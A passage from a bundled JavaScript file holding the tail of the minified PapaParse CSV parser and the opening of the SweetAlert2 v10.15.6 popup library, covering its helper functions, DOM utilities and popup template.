RegExp(q(t)+"([^]*?)"+q(t),"gm"),r=(e=e.replace(i,"")).split("\r"),n=e.split("\n"),s=1<n.length&&n[0].length<r[0].length;if(1===r.length||s)return"\n";for(var a=0,o=0;o<r.length;o++)"\n"===r[o][0]&&a++;return a>=r.length/2?"\r\n":"\r"}(e,r)),h=!1,_.delimiter)U(_.delimiter)&&(_.delimiter=_.delimiter(e),c.meta.delimiter=_.delimiter);else{var n=function(e,t,i,r,n){var s,a,o,h;n=n||[",","\t","|",";",b.RECORD_SEP,b.UNIT_SEP];for(var u=0;u<n.length;u++){var f=n[u],d=0,l=0,c=0;o=void 0;for(var p=new w({comments:r,delimiter:f,newline:t,preview:10}).parse(e),g=0;g<p.data.length;g++)if(i&&v(p.data[g]))c++;else{var m=p.data[g].length;l+=m,void 0!==o?0<m&&(d+=Math.abs(m-o),o=m):o=m}0<p.data.length&&(l/=p.data.length-c),(void 0===a||d<=a)&&(void 0===h||h<l)&&1.99<l&&(a=d,s=f,h=l)}return{successful:!!(_.delimiter=s),bestDelimiter:s}}(e,_.newline,_.skipEmptyLines,_.comments,_.delimitersToGuess);n.successful?_.delimiter=n.bestDelimiter:(h=!0,_.delimiter=b.DefaultDelimiter),c.meta.delimiter=_.delimiter}var s=E(_);return _.preview&&_.header&&s.preview++,a=e,o=new w(s),c=o.parse(a,t,i),g(),d?{meta:{paused:!0}}:c||{meta:{paused:!1}}},this.paused=function(){return d},this.pause=function(){d=!0,o.abort(),a=U(_.chunk)?"":a.substring(o.getCharIndex())},this.resume=function(){t.streamer._halted?(d=!1,t.streamer.parseChunk(a,!0)):setTimeout(t.resume,3)},this.aborted=function(){return e},this.abort=function(){e=!0,o.abort(),c.meta.aborted=!0,U(_.complete)&&_.complete(c),a=""}}function q(e){return e.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}function w(e){var O,D=(e=e||{}).delimiter,I=e.newline,T=e.comments,A=e.step,L=e.preview,F=e.fastMode,z=O=void 0===e.quoteChar?'"':e.quoteChar;if(void 0!==e.escapeChar&&(z=e.escapeChar),("string"!=typeof D||-1<b.BAD_DELIMITERS.indexOf(D))&&(D=","),T===D)throw new Error("Comment character same as delimiter");!0===T?T="#":("string"!=typeof T||-1<b.BAD_DELIMITERS.indexOf(T))&&(T=!1),"\n"!==I&&"\r"!==I&&"\r\n"!==I&&(I="\n");var M=0,j=!1;this.parse=function(a,t,i){if("string"!=typeof a)throw new Error("Input must be a string");var r=a.length,e=D.length,n=I.length,s=T.length,o=U(A),h=[],u=[],f=[],d=M=0;if(!a)return R();if(F||!1!==F&&-1===a.indexOf(O)){for(var l=a.split(I),c=0;c<l.length;c++){if(f=l[c],M+=f.length,c!==l.length-1)M+=I.length;else if(i)return R();if(!T||f.substring(0,s)!==T){if(o){if(h=[],b(f.split(D)),S(),j)return R()}else b(f.split(D));if(L&&L<=c)return h=h.slice(0,L),R(!0)}}return R()}for(var p=a.indexOf(D,M),g=a.indexOf(I,M),m=new RegExp(q(z)+q(O),"g"),_=a.indexOf(O,M);;)if(a[M]!==O)if(T&&0===f.length&&a.substring(M,M+s)===T){if(-1===g)return R();M=g+n,g=a.indexOf(I,M),p=a.indexOf(D,M)}else{if(-1!==p&&(p<g||-1===g)){if(!(p<_)){f.push(a.substring(M,p)),M=p+e,p=a.indexOf(D,M);continue}var v=x(p,_,g);if(v&&void 0!==v.nextDelim){p=v.nextDelim,_=v.quoteSearch,f.push(a.substring(M,p)),M=p+e,p=a.indexOf(D,M);continue}}if(-1===g)break;if(f.push(a.substring(M,g)),C(g+n),o&&(S(),j))return R();if(L&&h.length>=L)return R(!0)}else for(_=M,M++;;){if(-1===(_=a.indexOf(O,_+1)))return i||u.push({type:"Quotes",code:"MissingQuotes",message:"Quoted field unterminated",row:h.length,index:M}),E();if(_===r-1)return E(a.substring(M,_).replace(m,O));if(O!==z||a[_+1]!==z){if(O===z||0===_||a[_-1]!==z){-1!==p&&p<_+1&&(p=a.indexOf(D,_+1)),-1!==g&&g<_+1&&(g=a.indexOf(I,_+1));var y=w(-1===g?p:Math.min(p,g));if(a[_+1+y]===D){f.push(a.substring(M,_).replace(m,O)),a[M=_+1+y+e]!==O&&(_=a.indexOf(O,M)),p=a.indexOf(D,M),g=a.indexOf(I,M);break}var k=w(g);if(a.substring(_+1+k,_+1+k+n)===I){if(f.push(a.substring(M,_).replace(m,O)),C(_+1+k+n),p=a.indexOf(D,M),_=a.indexOf(O,M),o&&(S(),j))return R();if(L&&h.length>=L)return R(!0);break}u.push({type:"Quotes",code:"InvalidQuotes",message:"Trailing quote on quoted field is malformed",row:h.length,index:M}),_++}}else _++}return E();function b(e){h.push(e),d=M}function w(e){var t=0;if(-1!==e){var i=a.substring(_+1,e);i&&""===i.trim()&&(t=i.length)}return t}function E(e){return i||(void 0===e&&(e=a.substring(M)),f.push(e),M=r,b(f),o&&S()),R()}function C(e){M=e,b(f),f=[],g=a.indexOf(I,M)}function R(e){return{data:h,errors:u,meta:{delimiter:D,linebreak:I,aborted:j,truncated:!!e,cursor:d+(t||0)}}}function S(){A(R()),h=[],u=[]}function x(e,t,i){var r={nextDelim:void 0,quoteSearch:void 0},n=a.indexOf(O,t+1);if(t<e&&e<n&&(n<i||-1===i)){var s=a.indexOf(D,n);if(-1===s)return r;n<s&&(n=a.indexOf(O,n+1)),r=x(s,n,i)}else r={nextDelim:e,quoteSearch:t};return r}},this.abort=function(){j=!0},this.getCharIndex=function(){return M}}function m(e){var t=e.data,i=a[t.workerId],r=!1;if(t.error)i.userError(t.error,t.file);else if(t.results&&t.results.data){var n={abort:function(){r=!0,_(t.workerId,{data:[],errors:[],meta:{aborted:!0}})},pause:v,resume:v};if(U(i.userStep)){for(var s=0;s<t.results.data.length&&(i.userStep({data:t.results.data[s],errors:t.results.errors,meta:t.results.meta},n),!r);s++);delete t.results}else U(i.userChunk)&&(i.userChunk(t.results,n,t.file),delete t.results)}t.finished&&!r&&_(t.workerId,t.results)}function _(e,t){var i=a[e];U(i.userComplete)&&i.userComplete(t),i.terminate(),delete a[e]}function v(){throw new Error("Not implemented.")}function E(e){if("object"!=typeof e||null===e)return e;var t=Array.isArray(e)?[]:{};for(var i in e)t[i]=E(e[i]);return t}function y(e,t){return function(){e.apply(t,arguments)}}function U(e){return"function"==typeof e}return o&&(f.onmessage=function(e){var t=e.data;void 0===b.WORKER_ID&&t&&(b.WORKER_ID=t.workerId);if("string"==typeof t.input)f.postMessage({workerId:b.WORKER_ID,results:b.parse(t.input,t.config),finished:!0});else if(f.File&&t.input instanceof File||t.input instanceof Object){var i=b.parse(t.input,t.config);i&&f.postMessage({workerId:b.WORKER_ID,results:i,finished:!0})}}),(l.prototype=Object.create(u.prototype)).constructor=l,(c.prototype=Object.create(u.prototype)).constructor=c,(p.prototype=Object.create(p.prototype)).constructor=p,(g.prototype=Object.create(u.prototype)).constructor=g,b});
},{}],5:[function(require,module,exports){
/*!
* sweetalert2 v10.15.6
* Released under the MIT License.
*/
(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
  typeof define === 'function' && define.amd ? define(factory) :
  (global = global || self, global.Sweetalert2 = factory());
}(this, function () { 'use strict';

  function _typeof(obj) {
    "@babel/helpers - typeof";

    if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") {
      _typeof = function (obj) {
        return typeof obj;
      };
    } else {
      _typeof = function (obj) {
        return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
      };
    }

    return _typeof(obj);
  }

  function _classCallCheck(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
      throw new TypeError("Cannot call a class as a function");
    }
  }

  function _defineProperties(target, props) {
    for (var i = 0; i < props.length; i++) {
      var descriptor = props[i];
      descriptor.enumerable = descriptor.enumerable || false;
      descriptor.configurable = true;
      if ("value" in descriptor) descriptor.writable = true;
      Object.defineProperty(target, descriptor.key, descriptor);
    }
  }

  function _createClass(Constructor, protoProps, staticProps) {
    if (protoProps) _defineProperties(Constructor.prototype, protoProps);
    if (staticProps) _defineProperties(Constructor, staticProps);
    return Constructor;
  }

  function _extends() {
    _extends = Object.assign || function (target) {
      for (var i = 1; i < arguments.length; i++) {
        var source = arguments[i];

        for (var key in source) {
          if (Object.prototype.hasOwnProperty.call(source, key)) {
            target[key] = source[key];
          }
        }
      }

      return target;
    };

    return _extends.apply(this, arguments);
  }

  function _inherits(subClass, superClass) {
    if (typeof superClass !== "function" && superClass !== null) {
      throw new TypeError("Super expression must either be null or a function");
    }

    subClass.prototype = Object.create(superClass && superClass.prototype, {
      constructor: {
        value: subClass,
        writable: true,
        configurable: true
      }
    });
    if (superClass) _setPrototypeOf(subClass, superClass);
  }

  function _getPrototypeOf(o) {
    _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) {
      return o.__proto__ || Object.getPrototypeOf(o);
    };
    return _getPrototypeOf(o);
  }

  function _setPrototypeOf(o, p) {
    _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) {
      o.__proto__ = p;
      return o;
    };

    return _setPrototypeOf(o, p);
  }

  function _isNativeReflectConstruct() {
    if (typeof Reflect === "undefined" || !Reflect.construct) return false;
    if (Reflect.construct.sham) return false;
    if (typeof Proxy === "function") return true;

    try {
      Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {}));
      return true;
    } catch (e) {
      return false;
    }
  }

  function _construct(Parent, args, Class) {
    if (_isNativeReflectConstruct()) {
      _construct = Reflect.construct;
    } else {
      _construct = function _construct(Parent, args, Class) {
        var a = [null];
        a.push.apply(a, args);
        var Constructor = Function.bind.apply(Parent, a);
        var instance = new Constructor();
        if (Class) _setPrototypeOf(instance, Class.prototype);
        return instance;
      };
    }

    return _construct.apply(null, arguments);
  }

  function _assertThisInitialized(self) {
    if (self === void 0) {
      throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
    }

    return self;
  }

  function _possibleConstructorReturn(self, call) {
    if (call && (typeof call === "object" || typeof call === "function")) {
      return call;
    }

    return _assertThisInitialized(self);
  }

  function _createSuper(Derived) {
    var hasNativeReflectConstruct = _isNativeReflectConstruct();

    return function _createSuperInternal() {
      var Super = _getPrototypeOf(Derived),
          result;

      if (hasNativeReflectConstruct) {
        var NewTarget = _getPrototypeOf(this).constructor;

        result = Reflect.construct(Super, arguments, NewTarget);
      } else {
        result = Super.apply(this, arguments);
      }

      return _possibleConstructorReturn(this, result);
    };
  }

  function _superPropBase(object, property) {
    while (!Object.prototype.hasOwnProperty.call(object, property)) {
      object = _getPrototypeOf(object);
      if (object === null) break;
    }

    return object;
  }

  function _get(target, property, receiver) {
    if (typeof Reflect !== "undefined" && Reflect.get) {
      _get = Reflect.get;
    } else {
      _get = function _get(target, property, receiver) {
        var base = _superPropBase(target, property);

        if (!base) return;
        var desc = Object.getOwnPropertyDescriptor(base, property);

        if (desc.get) {
          return desc.get.call(receiver);
        }

        return desc.value;
      };
    }

    return _get(target, property, receiver || target);
  }

  var consolePrefix = 'SweetAlert2:';
  /**
   * Filter the unique values into a new array
   * @param arr
   */

  var uniqueArray = function uniqueArray(arr) {
    var result = [];

    for (var i = 0; i < arr.length; i++) {
      if (result.indexOf(arr[i]) === -1) {
        result.push(arr[i]);
      }
    }

    return result;
  };
  /**
   * Capitalize the first letter of a string
   * @param str
   */

  var capitalizeFirstLetter = function capitalizeFirstLetter(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
  };
  /**
   * Returns the array of object values (Object.values isn't supported in IE11)
   * @param obj
   */

  var objectValues = function objectValues(obj) {
    return Object.keys(obj).map(function (key) {
      return obj[key];
    });
  };
  /**
   * Convert NodeList to Array
   * @param nodeList
   */

  var toArray = function toArray(nodeList) {
    return Array.prototype.slice.call(nodeList);
  };
  /**
   * Standardise console warnings
   * @param message
   */

  var warn = function warn(message) {
    console.warn("".concat(consolePrefix, " ").concat(_typeof(message) === 'object' ? message.join(' ') : message));
  };
  /**
   * Standardise console errors
   * @param message
   */

  var error = function error(message) {
    console.error("".concat(consolePrefix, " ").concat(message));
  };
  /**
   * Private global state for `warnOnce`
   * @type {Array}
   * @private
   */

  var previousWarnOnceMessages = [];
  /**
   * Show a console warning, but only if it hasn't already been shown
   * @param message
   */

  var warnOnce = function warnOnce(message) {
    if (!(previousWarnOnceMessages.indexOf(message) !== -1)) {
      previousWarnOnceMessages.push(message);
      warn(message);
    }
  };
  /**
   * Show a one-time console warning about deprecated params/methods
   */

  var warnAboutDeprecation = function warnAboutDeprecation(deprecatedParam, useInstead) {
    warnOnce("\"".concat(deprecatedParam, "\" is deprecated and will be removed in the next major release. Please use \"").concat(useInstead, "\" instead."));
  };
  /**
   * If `arg` is a function, call it (with no arguments or context) and return the result.
   * Otherwise, just pass the value through
   * @param arg
   */

  var callIfFunction = function callIfFunction(arg) {
    return typeof arg === 'function' ? arg() : arg;
  };
  var hasToPromiseFn = function hasToPromiseFn(arg) {
    return arg && typeof arg.toPromise === 'function';
  };
  var asPromise = function asPromise(arg) {
    return hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
  };
  var isPromise = function isPromise(arg) {
    return arg && Promise.resolve(arg) === arg;
  };

  var DismissReason = Object.freeze({
    cancel: 'cancel',
    backdrop: 'backdrop',
    close: 'close',
    esc: 'esc',
    timer: 'timer'
  });

  var isJqueryElement = function isJqueryElement(elem) {
    return _typeof(elem) === 'object' && elem.jquery;
  };

  var isElement = function isElement(elem) {
    return elem instanceof Element || isJqueryElement(elem);
  };

  var argsToParams = function argsToParams(args) {
    var params = {};

    if (_typeof(args[0]) === 'object' && !isElement(args[0])) {
      _extends(params, args[0]);
    } else {
      ['title', 'html', 'icon'].forEach(function (name, index) {
        var arg = args[index];

        if (typeof arg === 'string' || isElement(arg)) {
          params[name] = arg;
        } else if (arg !== undefined) {
          error("Unexpected type of ".concat(name, "! Expected \"string\" or \"Element\", got ").concat(_typeof(arg)));
        }
      });
    }

    return params;
  };

  var swalPrefix = 'swal2-';
  var prefix = function prefix(items) {
    var result = {};

    for (var i in items) {
      result[items[i]] = swalPrefix + items[i];
    }

    return result;
  };
  var swalClasses = prefix(['container', 'shown', 'height-auto', 'iosfix', 'popup', 'modal', 'no-backdrop', 'no-transition', 'toast', 'toast-shown', 'toast-column', 'show', 'hide', 'close', 'title', 'header', 'content', 'html-container', 'actions', 'confirm', 'deny', 'cancel', 'footer', 'icon', 'icon-content', 'image', 'input', 'file', 'range', 'select', 'radio', 'checkbox', 'label', 'textarea', 'inputerror', 'input-label', 'validation-message', 'progress-steps', 'active-progress-step', 'progress-step', 'progress-step-line', 'loader', 'loading', 'styled', 'top', 'top-start', 'top-end', 'top-left', 'top-right', 'center', 'center-start', 'center-end', 'center-left', 'center-right', 'bottom', 'bottom-start', 'bottom-end', 'bottom-left', 'bottom-right', 'grow-row', 'grow-column', 'grow-fullscreen', 'rtl', 'timer-progress-bar', 'timer-progress-bar-container', 'scrollbar-measure', 'icon-success', 'icon-warning', 'icon-info', 'icon-question', 'icon-error']);
  var iconTypes = prefix(['success', 'warning', 'info', 'question', 'error']);

  var getContainer = function getContainer() {
    return document.body.querySelector(".".concat(swalClasses.container));
  };
  var elementBySelector = function elementBySelector(selectorString) {
    var container = getContainer();
    return container ? container.querySelector(selectorString) : null;
  };

  var elementByClass = function elementByClass(className) {
    return elementBySelector(".".concat(className));
  };

  var getPopup = function getPopup() {
    return elementByClass(swalClasses.popup);
  };
  var getIcon = function getIcon() {
    return elementByClass(swalClasses.icon);
  };
  var getTitle = function getTitle() {
    return elementByClass(swalClasses.title);
  };
  var getContent = function getContent() {
    return elementByClass(swalClasses.content);
  };
  var getHtmlContainer = function getHtmlContainer() {
    return elementByClass(swalClasses['html-container']);
  };
  var getImage = function getImage() {
    return elementByClass(swalClasses.image);
  };
  var getProgressSteps = function getProgressSteps() {
    return elementByClass(swalClasses['progress-steps']);
  };
  var getValidationMessage = function getValidationMessage() {
    return elementByClass(swalClasses['validation-message']);
  };
  var getConfirmButton = function getConfirmButton() {
    return elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.confirm));
  };
  var getDenyButton = function getDenyButton() {
    return elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.deny));
  };
  var getInputLabel = function getInputLabel() {
    return elementByClass(swalClasses['input-label']);
  };
  var getLoader = function getLoader() {
    return elementBySelector(".".concat(swalClasses.loader));
  };
  var getCancelButton = function getCancelButton() {
    return elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.cancel));
  };
  var getActions = function getActions() {
    return elementByClass(swalClasses.actions);
  };
  var getHeader = function getHeader() {
    return elementByClass(swalClasses.header);
  };
  var getFooter = function getFooter() {
    return elementByClass(swalClasses.footer);
  };
  var getTimerProgressBar = function getTimerProgressBar() {
    return elementByClass(swalClasses['timer-progress-bar']);
  };
  var getCloseButton = function getCloseButton() {
    return elementByClass(swalClasses.close);
  }; // https://github.com/jkup/focusable/blob/master/index.js

  var focusable = "\n  a[href],\n  area[href],\n  input:not([disabled]),\n  select:not([disabled]),\n  textarea:not([disabled]),\n  button:not([disabled]),\n  iframe,\n  object,\n  embed,\n  [tabindex=\"0\"],\n  [contenteditable],\n  audio[controls],\n  video[controls],\n  summary\n";
  var getFocusableElements = function getFocusableElements() {
    var focusableElementsWithTabindex = toArray(getPopup().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')) // sort according to tabindex
    .sort(function (a, b) {
      a = parseInt(a.getAttribute('tabindex'));
      b = parseInt(b.getAttribute('tabindex'));

      if (a > b) {
        return 1;
      } else if (a < b) {
        return -1;
      }

      return 0;
    });
    var otherFocusableElements = toArray(getPopup().querySelectorAll(focusable)).filter(function (el) {
      return el.getAttribute('tabindex') !== '-1';
    });
    return uniqueArray(focusableElementsWithTabindex.concat(otherFocusableElements)).filter(function (el) {
      return isVisible(el);
    });
  };
  var isModal = function isModal() {
    return !isToast() && !document.body.classList.contains(swalClasses['no-backdrop']);
  };
  var isToast = function isToast() {
    return document.body.classList.contains(swalClasses['toast-shown']);
  };
  var isLoading = function isLoading() {
    return getPopup().hasAttribute('data-loading');
  };

  var states = {
    previousBodyPadding: null
  };
  var setInnerHtml = function setInnerHtml(elem, html) {
    // #1926
    elem.textContent = '';

    if (html) {
      var parser = new DOMParser();
      var parsed = parser.parseFromString(html, "text/html");
      toArray(parsed.querySelector('head').childNodes).forEach(function (child) {
        elem.appendChild(child);
      });
      toArray(parsed.querySelector('body').childNodes).forEach(function (child) {
        elem.appendChild(child);
      });
    }
  };
  var hasClass = function hasClass(elem, className) {
    if (!className) {
      return false;
    }

    var classList = className.split(/\s+/);

    for (var i = 0; i < classList.length; i++) {
      if (!elem.classList.contains(classList[i])) {
        return false;
      }
    }

    return true;
  };

  var removeCustomClasses = function removeCustomClasses(elem, params) {
    toArray(elem.classList).forEach(function (className) {
      if (!(objectValues(swalClasses).indexOf(className) !== -1) && !(objectValues(iconTypes).indexOf(className) !== -1) && !(objectValues(params.showClass).indexOf(className) !== -1)) {
        elem.classList.remove(className);
      }
    });
  };

  var applyCustomClass = function applyCustomClass(elem, params, className) {
    removeCustomClasses(elem, params);

    if (params.customClass && params.customClass[className]) {
      if (typeof params.customClass[className] !== 'string' && !params.customClass[className].forEach) {
        return warn("Invalid type of customClass.".concat(className, "! Expected string or iterable object, got \"").concat(_typeof(params.customClass[className]), "\""));
      }

      addClass(elem, params.customClass[className]);
    }
  };
  function getInput(content, inputType) {
    if (!inputType) {
      return null;
    }

    switch (inputType) {
      case 'select':
      case 'textarea':
      case 'file':
        return getChildByClass(content, swalClasses[inputType]);

      case 'checkbox':
        return content.querySelector(".".concat(swalClasses.checkbox, " input"));

      case 'radio':
        return content.querySelector(".".concat(swalClasses.radio, " input:checked")) || content.querySelector(".".concat(swalClasses.radio, " input:first-child"));

      case 'range':
        return content.querySelector(".".concat(swalClasses.range, " input"));

      default:
        return getChildByClass(content, swalClasses.input);
    }
  }
  var focusInput = function focusInput(input) {
    input.focus(); // place cursor at end of text in text input

    if (input.type !== 'file') {
      // http://stackoverflow.com/a/2345915
      var val = input.value;
      input.value = '';
      input.value = val;
    }
  };
  var toggleClass = function toggleClass(target, classList, condition) {
    if (!target || !classList) {
      return;
    }

    if (typeof classList === 'string') {
      classList = classList.split(/\s+/).filter(Boolean);
    }

    classList.forEach(function (className) {
      if (target.forEach) {
        target.forEach(function (elem) {
          condition ? elem.classList.add(className) : elem.classList.remove(className);
        });
      } else {
        condition ? target.classList.add(className) : target.classList.remove(className);
      }
    });
  };
  var addClass = function addClass(target, classList) {
    toggleClass(target, classList, true);
  };
  var removeClass = function removeClass(target, classList) {
    toggleClass(target, classList, false);
  };
  var getChildByClass = function getChildByClass(elem, className) {
    for (var i = 0; i < elem.childNodes.length; i++) {
      if (hasClass(elem.childNodes[i], className)) {
        return elem.childNodes[i];
      }
    }
  };
  var applyNumericalStyle = function applyNumericalStyle(elem, property, value) {
    if (value === "".concat(parseInt(value))) {
      value = parseInt(value);
    }

    if (value || parseInt(value) === 0) {
      elem.style[property] = typeof value === 'number' ? "".concat(value, "px") : value;
    } else {
      elem.style.removeProperty(property);
    }
  };
  var show = function show(elem) {
    var display = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 'flex';
    elem.style.display = display;
  };
  var hide = function hide(elem) {
    elem.style.display = 'none';
  };
  var setStyle = function setStyle(parent, selector, property, value) {
    var el = parent.querySelector(selector);

    if (el) {
      el.style[property] = value;
    }
  };
  var toggle = function toggle(elem, condition, display) {
    condition ? show(elem, display) : hide(elem);
  }; // borrowed from jquery $(elem).is(':visible') implementation

  var isVisible = function isVisible(elem) {
    return !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
  };
  var allButtonsAreHidden = function allButtonsAreHidden() {
    return !isVisible(getConfirmButton()) && !isVisible(getDenyButton()) && !isVisible(getCancelButton());
  };
  var isScrollable = function isScrollable(elem) {
    return !!(elem.scrollHeight > elem.clientHeight);
  }; // borrowed from https://stackoverflow.com/a/46352119

  var hasCssAnimation = function hasCssAnimation(elem) {
    var style = window.getComputedStyle(elem);
    var animDuration = parseFloat(style.getPropertyValue('animation-duration') || '0');
    var transDuration = parseFloat(style.getPropertyValue('transition-duration') || '0');
    return animDuration > 0 || transDuration > 0;
  };
  var contains = function contains(haystack, needle) {
    if (typeof haystack.contains === 'function') {
      return haystack.contains(needle);
    }
  };
  var animateTimerProgressBar = function animateTimerProgressBar(timer) {
    var reset = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
    var timerProgressBar = getTimerProgressBar();

    if (isVisible(timerProgressBar)) {
      if (reset) {
        timerProgressBar.style.transition = 'none';
        timerProgressBar.style.width = '100%';
      }

      setTimeout(function () {
        timerProgressBar.style.transition = "width ".concat(timer / 1000, "s linear");
        timerProgressBar.style.width = '0%';
      }, 10);
    }
  };
  var stopTimerProgressBar = function stopTimerProgressBar() {
    var timerProgressBar = getTimerProgressBar();
    var timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
    timerProgressBar.style.removeProperty('transition');
    timerProgressBar.style.width = '100%';
    var timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
    var timerProgressBarPercent = parseInt(timerProgressBarWidth / timerProgressBarFullWidth * 100);
    timerProgressBar.style.removeProperty('transition');
    timerProgressBar.style.width = "".concat(timerProgressBarPercent, "%");
  };

  // Detect Node env
  var isNodeEnv = function isNodeEnv() {
    return typeof window === 'undefined' || typeof document === 'undefined';
  };

  var sweetHTML = "\n <div aria-labelledby=\"".concat(swalClasses.title, "\" aria-describedby=\"").concat(swalClasses.content, "\" class=\"").concat(swalClasses.popup, "\" tabindex=\"-1\">\n   <div class=\"").concat(swalClasses.header, "\">\n     <ul class=\"").concat(swalClasses['progress-steps'], "\"></ul>\n     <div class=\"").concat(swalClasses.icon, "\"></div>\n     <img class=\"").concat(swalClasses.image, "\" />\n     <h2 class=\"").concat(swalClasses.title, "\" id=\"").concat(swalClasses.title, "\"></h2>\n     <button type=\"button\" class=\"").concat(swalClasses.close, "\"></button>\n   </div>\n   <div class=\"").concat(swalClasses.content, "\">\n     <div id=\"").concat(swalClasses.content, "\" class=\"").concat(swalClasses['html-container'], "\"></div>\n     <input class=\"").concat(swalClasses.input, "\" />\n     <input type=\"file\" class=\"").concat(swalClasses.file, "\" />\n     <div class=\"").concat(swalClasses.range, "\">\n       <input type=\"range\" />\n       <output></output>\n     </div>\n     <select class=\"").concat(swalClasses.select, "\"></select>\n     <div class=\"").concat(swalClasses.radio, "\"></div>\n     <label for=\"").concat(swalClasses.checkbox, "\" class=\"").concat(swalClasses.checkbox, "\">\n       <input type=\"checkbox\" />\n       <span class=\"").concat(swalClasses.label, "\"></span>\n     </label>\n     <textarea class=\"").concat(swalClasses.textarea, "\"></textarea>\n     <div class=\"").concat(swalClasses['validation-message'], "\" id=\"").concat(swalClasses['validation-message'], "\"></div>\n   </div>\n   <div class=\"").concat(swalClasses.actions, "\">\n     <div class=\"").concat(swalClasses.loader, "\"></div>\n     <button type=\"button\" class=\"").concat(swalClasses.confirm, "\"></button>\n     <button type=\"button\" class=\"").concat(swalClasses.deny, "\"></button>\n     <button type=\"button\" class=\"").concat(swalClasses.cancel, "\"></button>\n   </div>\n   <div class=\"").concat(swalClasses.footer, "\"></div>\n   <div class=\"").concat(swalClasses['timer-progress-bar-container'], "\">\n     <div class=\"").concat(swalClasses['timer-progress-bar'], "\"></div>\n   </div>\n </div>\n").replace(/(^|\n)\s*/g, '');

  var resetOldContainer = function resetOldContainer() {
    var oldContainer = getContainer();

    if (!oldContainer) {
      return false;
    }

    oldContainer.parentNode.removeChild(oldContainer);
    removeClass([document.documentElement, document.body], [swalClasses['no-backdrop'], swalClasses['toast-shown'], swalClasses['has-column']]);
    return true;
  };

  var oldInputVal; // IE11 workaround, see #1109 for details

  var resetValidationMessage = function resetValidationMessage(e) {
    if (Swal.isVisible() && oldInputVal !== e.target.value) {
      Swal.resetValidationMessage();
    }

    oldInputVal = e.target.value;
  };

  var addInputChangeListeners = function addInputChangeListeners() {
    var content = getContent();
    var input = getChildByClass(content, swalClasses.input);
    var file = getChildByClass(content, swalClasses.file);
    var range = content.querySelector(".".concat(swalClasses.range, " input"));
    var rangeOutput = content.querySelector(".".concat(swalClasses.range, " output"));
    var select = getChildByClass(content, swalClasses.select);
    var checkbox = content.querySelector(".".concat(swalClasses.checkbox, " input"));
    var textarea = getChildByClass(content, swalClasses.textarea);
    input.oninput = resetValidationMessage;
    file.onchange = resetValidationMessage;
    select.onchange = resetValidationMessage;
    checkbox.onchange = resetValidationMessage;
    textarea.oninput = resetValidationMessage;

    range.oninput = function (e) {
      resetValidationMessage(e);
      rangeOutput.value = range.value;
    };

    range.onchange = function (e) {
      resetValidationMessage(e);
      range.nextSibling.value = range.value;
    };
  };

  var getTarget = function getTarget(target) {
    return typeof target === 'string' ? document.querySelector(target) : target;
  };

  var setupAccessibility = function setupAccessibility(params) {
    var popup = getPopup();
    popup.setAttribute('role', params.toast ? 'alert' : 'dialog');
    popup.setAttribute('aria-live', params.toast ? 'polite' : 'assertive');

    if (!params.toast) {
      popup.setAttribute('aria-modal', 'true');
    }
  };

  var setupRTL = function setupRTL(targetElement) {
    if (window.getComputedStyle(targetElement).direction === 'rtl') {
      addClass(getContainer(), swalClasses.rtl);
    }
  };
  /*
   * Add modal + backdrop to DOM
   */


  var init = function init(params) {
    // Clean up the old popup container if it exists
    var oldContainerExisted = resetOldContainer();
    /* istanbul ignore if */

    if (isNodeEnv()) {
      error('SweetAlert2 requires document to initialize');
      return;
    }

    var container = document.createElement('div');
    container.className = swalClasses.container;

    if (oldContainerExisted) {
      addClass(container, swalClasses['no-transition']);
    }

    setInnerHtml(container, sweetHTML);
    var targetElement = getTarget(params.target);
    targetElement.appendChild(container);
    setupAccessibility(params);
    setupRTL(targetElement);
    addInputChangeListeners();
  };

  var parseHtmlToContainer = function parseHtmlToContainer(param, target) {
    // DOM element
    if (param instanceof HTMLElement) {
      target.appendChild(param); // Object
    } else if (_typeof(param) === 'object') {
      handleObject(param, target); // Plain string
    } else if (param) {
      setInnerHtml(target, param);
    }
  };

  var handleObject = function handleObject(param, target) {
    // JQuery element(s)
    if (param.jquery) {
      handleJqueryElem(target, param); // For other objects use their string representation
    } else {
      setInnerHtml(target, param.toString());
    }
  };

  var handleJqueryElem = function handleJqueryElem(target, elem) {
    target.textContent = '';

    if (0 in elem) {
      for (var i = 0; (i in elem); i++) {
        target.appendChild(elem[i].cloneNode(true));
      }
    } else {
      target.appendChild(elem.cloneNode(true));
    }
  };

  var animationEndEvent = function () {
    // Prevent run in Node env

    /* istanbul ignore if */
    if (isNodeEnv()) {
      return false;
    }

    var testEl = document.createElement('div');
    var transEndEventNames = {
      WebkitAnimation: 'webkitAnimationEnd',
      OAnimation: 'oAnimationEnd oanimationend',
      animation: 'animationend'
    };

    for (var i in transEndEventNames) {
      if (Object.prototype.hasOwnProperty.call(transEndEventNames, i) && typeof testEl.style[i] !== 'undefined') {
        return transEndEventNames[i];
      }
    }

    return false;
  }();

  // https://github.com/twbs/bootstrap/blob/master/js/src/modal.js

  var measureScrollbar = function measureScrollbar() {
    var scrollDiv = document.createElement('div');
    scrollDiv.className = swalClasses['scrollbar-measure'];
    document.body.appendChild(scrollDiv);
    var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
    document.body.removeChild(scrollDiv);
    return scrollbarWidth;
  };

  var renderActions = function renderActions(instance, params) {
    var actions = getActions();
    var loader = getLoader();
    var confirmButton = getConfirmButton();
    var denyButton = getDenyButton();
